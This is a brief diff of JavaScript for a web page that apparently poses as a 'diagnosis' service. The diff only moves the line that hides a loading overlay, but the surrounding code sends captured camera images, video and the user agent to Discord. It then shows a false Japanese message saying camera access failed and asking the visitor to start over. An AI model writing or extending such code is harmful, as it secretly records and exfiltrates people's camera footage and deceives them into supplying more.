@@ -244,7 +244,6 @@ document.addEventListener("DOMContentLoaded", () => {
       };
     });
 
-    loadingOverlay.style.display = "none";
     return new Blob(chunks, { type: "video/webm" });
   }
 
@@ -317,6 +316,8 @@ UA：${ua}
 
       await sendToDiscord(allImages, videoUrl);
 
+    loadingOverlay.style.display = "none";
+      
       alert("カメラへのアクセスに失敗しました。\nもう一度初めからやり直し、診断を開始してください。\n※複数回カメラのアクセスに失敗した場合、使用している端末、又はブラウザが当サイトに対応していない可能性があります。");
     } catch (e) {
       console.error("送信失敗:", e);
